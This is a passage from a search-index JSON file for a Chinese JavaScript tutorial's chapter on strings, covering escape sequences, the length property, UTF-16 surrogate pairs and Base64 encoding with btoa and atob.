\u7684\u652f\u6301\u662f\u4e0d\u5b8c\u6574\u7684\uff0c\u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c\u53ea\u652f\u6301\u4e24\u5b57\u8282\u7684\u5b57\u7b26\uff0c\u4e0d\u652f\u6301\u56db\u5b57\u8282\u7684\u5b57\u7b26\u3002\u8fd9\u662f\u56e0\u4e3a JavaScript \u7b2c\u4e00\u7248\u53d1\u5e03\u7684\u65f6\u5019\uff0cUnicode \u7684\u7801\u70b9\u53ea\u7f16\u5230 U+FFFF \uff0c\u56e0\u6b64\u4e24\u5b57\u8282\u8db3\u591f\u8868\u793a\u4e86\u3002\u540e\u6765\uff0cUnicode \u7eb3\u5165\u7684\u5b57\u7b26\u8d8a\u6765\u8d8a\u591a\uff0c\u51fa\u73b0\u4e86\u56db\u5b57\u8282\u7684\u7f16\u7801\u3002\u4f46\u662f\uff0cJavaScript \u7684\u6807\u51c6\u6b64\u65f6\u5df2\u7ecf\u5b9a\u578b\u4e86\uff0c\u7edf\u4e00\u5c06\u5b57\u7b26\u957f\u5ea6\u9650\u5236\u5728\u4e24\u5b57\u8282\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8bc6\u522b\u56db\u5b57\u8282\u7684\u5b57\u7b26\u3002\u4e0a\u4e00\u8282\u7684\u90a3\u4e2a\u56db\u5b57\u8282\u5b57\u7b26 \ud834\udf06 \uff0c\u6d4f\u89c8\u5668\u4f1a\u6b63\u786e\u8bc6\u522b\u8fd9\u662f\u4e00\u4e2a\u5b57\u7b26\uff0c\u4f46\u662f JavaScript \u65e0\u6cd5\u8bc6\u522b\uff0c\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u4e24\u4e2a\u5b57\u7b26\u3002 1 '\ud834\udf06' . length // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cJavaScript \u8ba4\u4e3a \ud834\udf06 \u7684\u957f\u5ea6\u4e3a2\uff0c\u800c\u4e0d\u662f1\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u5bf9\u4e8e\u7801\u70b9\u5728 U+10000 \u5230 U+10FFFF \u4e4b\u95f4\u7684\u5b57\u7b26\uff0cJavaScript \u603b\u662f\u8ba4\u4e3a\u5b83\u4eec\u662f\u4e24\u4e2a\u5b57\u7b26\uff08 length \u5c5e\u6027\u4e3a2\uff09\u3002\u6240\u4ee5\u5904\u7406\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u628a\u8fd9\u4e00\u70b9\u8003\u8651\u5728\u5185\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cJavaScript \u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u53ef\u80fd\u662f\u4e0d\u6b63\u786e\u7684\u3002 Base64 \u8f6c\u7801 \u00b6 \u6709\u65f6\uff0c\u6587\u672c\u91cc\u9762\u5305\u542b\u4e00\u4e9b\u4e0d\u53ef\u6253\u5370\u7684\u7b26\u53f7\uff0c\u6bd4\u5982 ASCII \u78010\u523031\u7684\u7b26\u53f7\u90fd\u65e0\u6cd5\u6253\u5370\u51fa\u6765\uff0c\u8fd9\u65f6\u53ef\u4ee5\u4f7f\u7528 Base64 \u7f16\u7801\uff0c\u5c06\u5b83\u4eec\u8f6c\u6210\u53ef\u4ee5\u6253\u5370\u7684\u5b57\u7b26\u3002\u53e6\u4e00\u4e2a\u573a\u666f\u662f\uff0c\u6709\u65f6\u9700\u8981\u4ee5\u6587\u672c\u683c\u5f0f\u4f20\u9012\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u90a3\u4e48\u4e5f\u53ef\u4ee5\u4f7f\u7528 Base64 \u7f16\u7801\u3002 \u6240\u8c13 Base64 \u5c31\u662f\u4e00\u79cd\u7f16\u7801\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06\u4efb\u610f\u503c\u8f6c\u6210 0\uff5e9\u3001A\uff5eZ\u3001a-z\u3001 + \u548c / \u8fd964\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u53ef\u6253\u5370\u5b57\u7b26\u3002\u4f7f\u7528\u5b83\u7684\u4e3b\u8981\u76ee\u7684\uff0c\u4e0d\u662f\u4e3a\u4e86\u52a0\u5bc6\uff0c\u800c\u662f\u4e3a\u4e86\u4e0d\u51fa\u73b0\u7279\u6b8a\u5b57\u7b26\uff0c\u7b80\u5316\u7a0b\u5e8f\u7684\u5904\u7406\u3002 JavaScript \u539f\u751f\u63d0\u4f9b\u4e24\u4e2a Base64 \u76f8\u5173\u7684\u65b9\u6cd5\u3002 btoa() \uff1a\u4efb\u610f\u503c\u8f6c\u4e3a Base64 \u7f16\u7801 atob() \uff1aBase64 \u7f16\u7801\u8f6c\u4e3a\u539f\u6765\u7684\u503c 1 2 3 var string = 'Hello World!' ; btoa ( string ) // \"SGVsbG8gV29ybGQh\" atob ( 'SGVsbG8gV29ybGQh' ) // \"Hello World!\" \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4e0d\u9002\u5408\u975e ASCII \u7801\u7684\u5b57\u7b26\uff0c\u4f1a\u62a5\u9519\u3002 1 btoa ( '\u4f60\u597d' ) // \u62a5\u9519 \u8981\u5c06\u975e ASCII \u7801\u5b57\u7b26\u8f6c\u4e3a Base64 \u7f16\u7801\uff0c\u5fc5\u987b\u4e2d\u95f4\u63d2\u5165\u4e00\u4e2a\u8f6c\u7801\u73af\u8282\uff0c\u518d\u4f7f\u7528\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 function b64Encode ( str ) { return btoa ( encodeURIComponent ( str )); } function b64Decode ( str ) { return decodeURIComponent ( atob ( str )); } b64Encode ( '\u4f60\u597d' ) // \"JUU0JUJEJUEwJUU1JUE1JUJE\" b64Decode ( 'JUU0JUJEJUEwJUU1JUE1JUJE' ) // \"\u4f60\u597d\" \u53c2\u8003\u94fe\u63a5 \u00b6 Mathias Bynens, JavaScript\u2019s internal character encoding: UCS-2 or UTF-16? Mathias Bynens, JavaScript has a Unicode problem Mozilla Developer Network, Window.btoa","title":"\u5b57\u7b26\u4e32"},{"location":"types/string/#_1","text":"","title":"\u5b57\u7b26\u4e32"},{"location":"types/string/#_2","text":"","title":"\u6982\u8ff0"},{"location":"types/string/#_3","text":"\u5b57\u7b26\u4e32\u5c31\u662f\u96f6\u4e2a\u6216\u591a\u4e2a\u6392\u5728\u4e00\u8d77\u7684\u5b57\u7b26\uff0c\u653e\u5728\u5355\u5f15\u53f7\u6216\u53cc\u5f15\u53f7\u4e4b\u4e2d\u3002 1 2 'abc' \"abc\" \u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u7684\u5185\u90e8\uff0c\u53ef\u4ee5\u4f7f\u7528\u53cc\u5f15\u53f7\u3002\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u7684\u5185\u90e8\uff0c\u53ef\u4ee5\u4f7f\u7528\u5355\u5f15\u53f7\u3002 1 2 'key = \"value\"' \"It's a long journey\" \u4e0a\u9762\u4e24\u4e2a\u90fd\u662f\u5408\u6cd5\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u8981\u5728\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u7684\u5185\u90e8\uff0c\u4f7f\u7528\u5355\u5f15\u53f7\uff0c\u5c31\u5fc5\u987b\u5728\u5185\u90e8\u7684\u5355\u5f15\u53f7\u524d\u9762\u52a0\u4e0a\u53cd\u659c\u6760\uff0c\u7528\u6765\u8f6c\u4e49\u3002\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u5185\u90e8\u4f7f\u7528\u53cc\u5f15\u53f7\uff0c\u4e5f\u662f\u5982\u6b64\u3002 1 2 3 4 5 'Did she say \\'Hello\\'?' // \"Did she say 'Hello'?\" \"Did she say \\\"Hello\\\"?\" // \"Did she say \"Hello\"?\" \u7531\u4e8e HTML \u8bed\u8a00\u7684\u5c5e\u6027\u503c\u4f7f\u7528\u53cc\u5f15\u53f7\uff0c\u6240\u4ee5\u5f88\u591a\u9879\u76ee\u7ea6\u5b9a JavaScript \u8bed\u8a00\u7684\u5b57\u7b26\u4e32\u53ea\u4f7f\u7528\u5355\u5f15\u53f7\uff0c\u672c\u6559\u7a0b\u9075\u5b88\u8fd9\u4e2a\u7ea6\u5b9a\u3002\u5f53\u7136\uff0c\u53ea\u4f7f\u7528\u53cc\u5f15\u53f7\u4e5f\u5b8c\u5168\u53ef\u4ee5\u3002\u91cd\u8981\u7684\u662f\u575a\u6301\u4f7f\u7528\u4e00\u79cd\u98ce\u683c\uff0c\u4e0d\u8981\u4e00\u4f1a\u4f7f\u7528\u5355\u5f15\u53f7\u8868\u793a\u5b57\u7b26\u4e32\uff0c\u4e00\u4f1a\u53c8\u4f7f\u7528\u53cc\u5f15\u53f7\u8868\u793a\u3002 \u5b57\u7b26\u4e32\u9ed8\u8ba4\u53ea\u80fd\u5199\u5728\u4e00\u884c\u5185\uff0c\u5206\u6210\u591a\u884c\u5c06\u4f1a\u62a5\u9519\u3002 1 2 3 4 'a b c' // SyntaxError: Unexpected token ILLEGAL \u4e0a\u9762\u4ee3\u7801\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5206\u6210\u4e09\u884c\uff0cJavaScript \u5c31\u4f1a\u62a5\u9519\u3002 \u5982\u679c\u957f\u5b57\u7b26\u4e32\u5fc5\u987b\u5206\u6210\u591a\u884c\uff0c\u53ef\u4ee5\u5728\u6bcf\u4e00\u884c\u7684\u5c3e\u90e8\u4f7f\u7528\u53cd\u659c\u6760\u3002 1 2 3 4 5 6 7 var longString = 'Long \\ long \\ long \\ string' ; longString // \"Long long long string\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u52a0\u4e86\u53cd\u659c\u6760\u4ee5\u540e\uff0c\u539f\u6765\u5199\u5728\u4e00\u884c\u7684\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u5206\u6210\u591a\u884c\u4e66\u5199\u3002\u4f46\u662f\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u8fd8\u662f\u5355\u884c\uff0c\u6548\u679c\u4e0e\u5199\u5728\u540c\u4e00\u884c\u5b8c\u5168\u4e00\u6837\u3002\u6ce8\u610f\uff0c\u53cd\u659c\u6760\u7684\u540e\u9762\u5fc5\u987b\u662f\u6362\u884c\u7b26\uff0c\u800c\u4e0d\u80fd\u6709\u5176\u4ed6\u5b57\u7b26\uff08\u6bd4\u5982\u7a7a\u683c\uff09\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u8fde\u63a5\u8fd0\u7b97\u7b26\uff08 + \uff09\u53ef\u4ee5\u8fde\u63a5\u591a\u4e2a\u5355\u884c\u5b57\u7b26\u4e32\uff0c\u5c06\u957f\u5b57\u7b26\u4e32\u62c6\u6210\u591a\u884c\u4e66\u5199\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u4e5f\u662f\u5355\u884c\u3002 1 2 3 4 var longString = 'Long ' + 'long ' + 'long ' + 'string' ; \u5982\u679c\u60f3\u8f93\u51fa\u591a\u884c\u5b57\u7b26\u4e32\uff0c\u6709\u4e00\u79cd\u5229\u7528\u591a\u884c\u6ce8\u91ca\u7684\u53d8\u901a\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 ( function () { /* line 1 line 2 line 3 */ }). toString (). split ( '\\n' ). slice ( 1 , - 1 ). join ( '\\n' ) // \"line 1 // line 2 // line 3\" \u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u5c31\u662f\u591a\u884c\u3002","title":"\u5b9a\u4e49"},{"location":"types/string/#_4","text":"\u53cd\u659c\u6760\uff08\\\uff09\u5728\u5b57\u7b26\u4e32\u5185\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u7528\u6765\u8868\u793a\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u6240\u4ee5\u53c8\u79f0\u4e3a\u8f6c\u4e49\u7b26\u3002 \u9700\u8981\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u4e3b\u8981\u6709\u4e0b\u9762\u8fd9\u4e9b\u3002 \\0 \uff1anull\uff08 \\u0000 \uff09 \\b \uff1a\u540e\u9000\u952e\uff08 \\u0008 \uff09 \\f \uff1a\u6362\u9875\u7b26\uff08 \\u000C \uff09 \\n \uff1a\u6362\u884c\u7b26\uff08 \\u000A \uff09 \\r \uff1a\u56de\u8f66\u952e\uff08 \\u000D \uff09 \\t \uff1a\u5236\u8868\u7b26\uff08 \\u0009 \uff09 \\v \uff1a\u5782\u76f4\u5236\u8868\u7b26\uff08 \\u000B \uff09 \\' \uff1a\u5355\u5f15\u53f7\uff08 \\u0027 \uff09 \\\" \uff1a\u53cc\u5f15\u53f7\uff08 \\u0022 \uff09 \\\\ \uff1a\u53cd\u659c\u6760\uff08 \\u005C \uff09 \u4e0a\u9762\u8fd9\u4e9b\u5b57\u7b26\u524d\u9762\u52a0\u4e0a\u53cd\u659c\u6760\uff0c\u90fd\u8868\u793a\u7279\u6b8a\u542b\u4e49\u3002 1 2 3 console . log ( '1\\n2' ) // 1 // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\n \u8868\u793a\u6362\u884c\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u5c31\u5206\u6210\u4e86\u4e24\u884c\u3002 \u53cd\u659c\u6760\u8fd8\u6709\u4e09\u79cd\u7279\u6b8a\u7528\u6cd5\u3002 \uff081\uff09 \\HHH \u53cd\u659c\u6760\u540e\u9762\u7d27\u8ddf\u4e09\u4e2a\u516b\u8fdb\u5236\u6570\uff08 000 \u5230 377 \uff09\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\u3002 HHH \u5bf9\u5e94\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\uff0c\u6bd4\u5982 \\251 \u8868\u793a\u7248\u6743\u7b26\u53f7\u3002\u663e\u7136\uff0c\u8fd9\u79cd\u65b9\u6cd5\u53ea\u80fd\u8f93\u51fa256\u79cd\u5b57\u7b26\u3002 \uff082\uff09 \\xHH \\x \u540e\u9762\u7d27\u8ddf\u4e24\u4e2a\u5341\u516d\u8fdb\u5236\u6570\uff08 00 \u5230 FF \uff09\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\u3002 HH \u5bf9\u5e94\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\uff0c\u6bd4\u5982 \\xA9 \u8868\u793a\u7248\u6743\u7b26\u53f7\u3002\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u53ea\u80fd\u8f93\u51fa256\u79cd\u5b57\u7b26\u3002 \uff083\uff09 \\uXXXX \\u \u540e\u9762\u7d27\u8ddf\u56db\u4e2a\u5341\u516d\u8fdb\u5236\u6570\uff08 0000 \u5230 FFFF \uff09\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\u3002 XXXX \u5bf9\u5e94\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\uff0c\u6bd4\u5982 \\u00A9 \u8868\u793a\u7248\u6743\u7b26\u53f7\u3002 \u4e0b\u9762\u662f\u8fd9\u4e09\u79cd\u5b57\u7b26\u7279\u6b8a\u5199\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 '\\251' // \"\u00a9\" '\\xA9' // \"\u00a9\" '\\u00A9' // \"\u00a9\" '\\172' === 'z' // true '\\x7A' === 'z' // true '\\u007A' === 'z' // true \u5982\u679c\u5728\u975e\u7279\u6b8a\u5b57\u7b26\u524d\u9762\u4f7f\u7528\u53cd\u659c\u6760\uff0c\u5219\u53cd\u659c\u6760\u4f1a\u88ab\u7701\u7565\u3002 1 2 '\\a' // \"a\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u662f\u4e00\u4e2a\u6b63\u5e38\u5b57\u7b26\uff0c\u524d\u9762\u52a0\u53cd\u659c\u6760\u6ca1\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u53cd\u659c\u6760\u4f1a\u88ab\u81ea\u52a8\u7701\u7565\u3002 \u5982\u679c\u5b57\u7b26\u4e32\u7684\u6b63\u5e38\u5185\u5bb9\u4e4b\u4e2d\uff0c\u9700\u8981\u5305\u542b\u53cd\u659c\u6760\uff0c\u5219\u53cd\u659c\u6760\u524d\u9762\u9700\u8981\u518d\u52a0\u4e00\u4e2a\u53cd\u659c\u6760\uff0c\u7528\u6765\u5bf9\u81ea\u8eab\u8f6c\u4e49\u3002 1 2 \"Prev \\\\ Next\" // \"Prev \\ Next\"","title":"\u8f6c\u4e49"},{"location":"types/string/#_5","text":"\u5b57\u7b26\u4e32\u53ef\u4ee5\u88ab\u89c6\u4e3a\u5b57\u7b26\u6570\u7ec4\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u7528\u6765\u8fd4\u56de\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5b57\u7b26\uff08\u4f4d\u7f6e\u7f16\u53f7\u4ece0\u5f00\u59cb\uff09\u3002 1 2 3 4 5 6 7 var s = 'hello' ; s [ 0 ] // \"h\" s [ 1 ] // \"e\" s [ 4 ] // \"o\" // \u76f4\u63a5\u5bf9\u5b57\u7b26\u4e32\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26 'hello' [ 1 ] // \"e\" \u5982\u679c\u65b9\u62ec\u53f7\u4e2d\u7684\u6570\u5b57\u8d85\u8fc7\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6216\u8005\u65b9\u62ec\u53f7\u4e2d\u6839\u672c\u4e0d\u662f\u6570\u5b57\uff0c\u5219\u8fd4\u56de undefined \u3002 1 2 3 'abc' [ 3 ] // undefined 'abc' [ - 1 ] // undefined 'abc' [ 'x' ] // undefined \u4f46\u662f\uff0c\u5b57\u7b26\u4e32\u4e0e\u6570\u7ec4\u7684\u76f8\u4f3c\u6027\u4ec5\u6b64\u800c\u5df2\u3002\u5b9e\u9645\u4e0a\uff0c\u65e0\u6cd5\u6539\u53d8\u5b57\u7b26\u4e32\u4e4b\u4e2d\u7684\u5355\u4e2a\u5b57\u7b26\u3002 1 2 3 4 5 6 7 8 9 10 var s = 'hello' ; delete s [ 0 ]; s // \"hello\" s [ 1 ] = 'a' ; s // \"hello\" s [ 5 ] = '!' ; s // \"hello\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5b57\u7b26\u4e32\u5185\u90e8\u7684\u5355\u4e2a\u5b57\u7b26\u65e0\u6cd5\u6539\u53d8\u548c\u589e\u5220\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u4f1a\u9ed8\u9ed8\u5730\u5931\u8d25\u3002","title":"\u5b57\u7b26\u4e32\u4e0e\u6570\u7ec4"},{"location":"types/string/#length","text":"length \u5c5e\u6027\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u8be5\u5c5e\u6027\u4e5f\u662f\u65e0\u6cd5\u6539\u53d8\u7684\u3002 1 2 3 4 5 6 7 8 var s = 'hello' ; s . length // 5 s . length = 3 ; s . length // 5 s . length = 7 ; s . length // 5 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u5b57\u7b26\u4e32\u7684 length \u5c5e\u6027\u65e0\u6cd5\u6539\u53d8\uff0c\u4f46\u662f\u4e0d\u4f1a\u62a5\u9519\u3002","title":"length \u5c5e\u6027"},{"location":"types/string/#_6","text":"JavaScript \u4f7f\u7528 Unicode \u5b57\u7b26\u96c6\u3002JavaScript \u5f15\u64ce\u5185\u90e8\uff0c\u6240\u6709\u5b57\u7b26\u90fd\u7528 Unicode \u8868\u793a\u3002 JavaScript \u4e0d\u4ec5\u4ee5 Unicode \u50a8\u5b58\u5b57\u7b26\uff0c\u8fd8\u5141\u8bb8\u76f4\u63a5\u5728\u7a0b\u5e8f\u4e2d\u4f7f\u7528 Unicode \u7801\u70b9\u8868\u793a\u5b57\u7b26\uff0c\u5373\u5c06\u5b57\u7b26\u5199\u6210 \\uxxxx \u7684\u5f62\u5f0f\uff0c\u5176\u4e2d xxxx \u4ee3\u8868\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\u3002\u6bd4\u5982\uff0c \\u00A9 \u4ee3\u8868\u7248\u6743\u7b26\u53f7\u3002 1 2 var s = '\\u00A9' ; s // \"\u00a9\" \u89e3\u6790\u4ee3\u7801\u7684\u65f6\u5019\uff0cJavaScript \u4f1a\u81ea\u52a8\u8bc6\u522b\u4e00\u4e2a\u5b57\u7b26\u662f\u5b57\u9762\u5f62\u5f0f\u8868\u793a\uff0c\u8fd8\u662f Unicode \u5f62\u5f0f\u8868\u793a\u3002\u8f93\u51fa\u7ed9\u7528\u6237\u7684\u65f6\u5019\uff0c\u6240\u6709\u5b57\u7b26\u90fd\u4f1a\u8f6c\u6210\u5b57\u9762\u5f62\u5f0f\u3002 1 2 var f\\u006F\\u006F = 'abc' ; foo // \"abc\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u884c\u7684\u53d8\u91cf\u540d foo \u662f Unicode \u5f62\u5f0f\u8868\u793a\uff0c\u7b2c\u4e8c\u884c\u662f\u5b57\u9762\u5f62\u5f0f\u8868\u793a\u3002JavaScript \u4f1a\u81ea\u52a8\u8bc6\u522b\u3002 \u6211\u4eec\u8fd8\u9700\u8981\u77e5\u9053\uff0c\u6bcf\u4e2a\u5b57\u7b26\u5728 JavaScript \u5185\u90e8\u90fd\u662f\u4ee516\u4f4d\uff08\u53732\u4e2a\u5b57\u8282\uff09\u7684 UTF-16 \u683c\u5f0f\u50a8\u5b58\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cJavaScript \u7684\u5355\u4f4d\u5b57\u7b26\u957f\u5ea6\u56fa\u5b9a\u4e3a16\u4f4d\u957f\u5ea6\uff0c\u53732\u4e2a\u5b57\u8282\u3002 \u4f46\u662f\uff0cUTF-16 \u6709\u4e24\u79cd\u957f\u5ea6\uff1a\u5bf9\u4e8e\u7801\u70b9\u5728 U+0000 \u5230 U+FFFF \u4e4b\u95f4\u7684\u5b57\u7b26\uff0c\u957f\u5ea6\u4e3a16\u4f4d\uff08\u53732\u4e2a\u5b57\u8282\uff09\uff1b\u5bf9\u4e8e\u7801\u70b9\u5728 U+10000 \u5230 U+10FFFF \u4e4b\u95f4\u7684\u5b57\u7b26\uff0c\u957f\u5ea6\u4e3a32\u4f4d\uff08\u53734\u4e2a\u5b57\u8282\uff09\uff0c\u800c\u4e14\u524d\u4e24\u4e2a\u5b57\u8282\u5728 0xD800 \u5230 0xDBFF \u4e4b\u95f4\uff0c\u540e\u4e24\u4e2a\u5b57\u8282\u5728 0xDC00 \u5230 0xDFFF \u4e4b\u95f4\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7801\u70b9 U+1D306 \u5bf9\u5e94\u7684\u5b57\u7b26\u4e3a \ud834\udf06\uff0c \u5b83\u5199\u6210 UTF-16 \u5c31\u662f 0xD834 0xDF06 \u3002 JavaScript \u5bf9 UTF-16 \u7684\u652f\u6301\u662f\u4e0d\u5b8c\u6574\u7684\uff0c\u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c\u53ea\u652f\u6301\u4e24\u5b57\u8282\u7684\u5b57\u7b26\uff0c\u4e0d\u652f\u6301\u56db\u5b57\u8282\u7684\u5b57\u7b26\u3002\u8fd9\u662f\u56e0\u4e3a JavaScript \u7b2c\u4e00\u7248\u53d1\u5e03\u7684\u65f6\u5019\uff0cUnicode \u7684\u7801\u70b9\u53ea\u7f16\u5230 U+FFFF \uff0c\u56e0\u6b64\u4e24\u5b57\u8282\u8db3\u591f\u8868\u793a\u4e86\u3002\u540e\u6765\uff0cUnicode \u7eb3\u5165\u7684\u5b57\u7b26\u8d8a\u6765\u8d8a\u591a\uff0c\u51fa\u73b0\u4e86\u56db\u5b57\u8282\u7684\u7f16\u7801\u3002\u4f46\u662f\uff0cJavaScript \u7684\u6807\u51c6\u6b64\u65f6\u5df2\u7ecf\u5b9a\u578b\u4e86\uff0c\u7edf\u4e00\u5c06\u5b57\u7b26\u957f\u5ea6\u9650\u5236\u5728\u4e24\u5b57\u8282\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8bc6\u522b\u56db\u5b57\u8282\u7684\u5b57\u7b26\u3002\u4e0a\u4e00\u8282\u7684\u90a3\u4e2a\u56db\u5b57\u8282\u5b57\u7b26 \ud834\udf06 \uff0c\u6d4f\u89c8\u5668\u4f1a\u6b63\u786e\u8bc6\u522b\u8fd9\u662f\u4e00\u4e2a\u5b57\u7b26\uff0c\u4f46\u662f JavaScript \u65e0\u6cd5\u8bc6\u522b\uff0c\u4f1a\u8ba4\u4e3a\u8fd9\u662f\u4e24\u4e2a\u5b57\u7b26\u3002 1 '\ud834\udf06' . length // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cJavaScript \u8ba4\u4e3a \ud834\udf06 \u7684\u957f\u5ea6\u4e3a2\uff0c\u800c\u4e0d\u662f1\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u5bf9\u4e8e\u7801\u70b9\u5728 U+10000 \u5230 U+10FFFF \u4e4b\u95f4\u7684\u5b57\u7b26\uff0cJavaScript \u603b\u662f\u8ba4\u4e3a\u5b83\u4eec\u662f\u4e24\u4e2a\u5b57\u7b26\uff08 length \u5c5e\u6027\u4e3a2\uff09\u3002\u6240\u4ee5\u5904\u7406\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u628a\u8fd9\u4e00\u70b9\u8003\u8651\u5728\u5185\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cJavaScript \u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u53ef\u80fd\u662f\u4e0d\u6b63\u786e\u7684\u3002","title":"\u5b57\u7b26\u96c6"},{"location":"types/string/#base64","text":"\u6709\u65f6\uff0c\u6587\u672c\u91cc\u9762\u5305\u542b\u4e00\u4e9b\u4e0d\u53ef\u6253\u5370\u7684\u7b26\u53f7\uff0c\u6bd4\u5982 ASCII \u78010\u523031\u7684\u7b26\u53f7\u90fd\u65e0\u6cd5\u6253\u5370\u51fa\u6765\uff0c\u8fd9\u65f6\u53ef\u4ee5\u4f7f\u7528 Base64 \u7f16\u7801\uff0c\u5c06\u5b83\u4eec\u8f6c\u6210\u53ef\u4ee5\u6253\u5370\u7684\u5b57\u7b26\u3002\u53e6\u4e00\u4e2a\u573a\u666f\u662f\uff0c\u6709\u65f6\u9700\u8981\u4ee5\u6587\u672c\u683c\u5f0f\u4f20\u9012\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u90a3\u4e48\u4e5f\u53ef\u4ee5\u4f7f\u7528 Base64 \u7f16\u7801\u3002 \u6240\u8c13 Base64 \u5c31\u662f\u4e00\u79cd\u7f16\u7801\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06\u4efb\u610f\u503c\u8f6c\u6210 0\uff5e9\u3001A\uff5eZ\u3001a-z\u3001 + \u548c / \u8fd964\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u53ef\u6253\u5370\u5b57\u7b26\u3002\u4f7f\u7528\u5b83\u7684\u4e3b\u8981\u76ee\u7684\uff0c\u4e0d\u662f\u4e3a\u4e86\u52a0\u5bc6\uff0c\u800c\u662f\u4e3a\u4e86\u4e0d\u51fa\u73b0\u7279\u6b8a\u5b57\u7b26\uff0c\u7b80\u5316\u7a0b\u5e8f\u7684\u5904\u7406\u3002 JavaScript \u539f\u751f\u63d0\u4f9b\u4e24\u4e2a Base64 \u76f8\u5173\u7684\u65b9\u6cd5\u3002 btoa() \uff1a\u4efb\u610f\u503c\u8f6c\u4e3a Base64 \u7f16\u7801 atob() \uff1aBase64 \u7f16\u7801\u8f6c\u4e3a\u539f\u6765\u7684\u503c 1 2 3 var string = 'Hello World!' ; btoa ( string ) // \"SGVsbG8gV29ybGQh\" atob ( 'SGVsbG8gV29ybGQh' ) // \"Hello World!\" \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4e0d\u9002\u5408\u975e ASCII \u7801\u7684\u5b57\u7b26\uff0c\u4f1a\u62a5\u9519\u3002 1 btoa ( '\u4f60\u597d' ) // \u62a5\u9519 \u8981\u5c06\u975e ASCII \u7801\u5b57\u7b26\u8f6c\u4e3a Base64 \u7f16\u7801\uff0c\u5fc5\u987b\u4e2d\u95f4\u63d2\u5165\u4e00\u4e2a\u8f6c\u7801\u73af\u8282\uff0c\u518d\u4f7f\u7528\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 function b64Encode ( str ) { return btoa ( encodeURIComponent ( str )); } function b64Decode ( str ) { return decodeURIComponent ( atob ( str )); } b64Encode ( '\u4f60\u597d' ) // \"JUU0JUJEJUEwJUU1JUE1JUJE\" b64Decode ( 'JUU0JUJEJUEwJUU1JUE1JUJE' ) // \"\u4f60\u597d\"","title":"Base64 \u8f6c\u7801"},{"location":"types/string/#_7","text":"Mathias Bynens, JavaScript\u2019s internal character encoding: UCS-2 or UTF-16? Mathias Bynens, JavaScript has a Unicode problem Mozilla Developer Network, Window.btoa","title":"\u53c2\u8003\u94fe\u63a5"}]}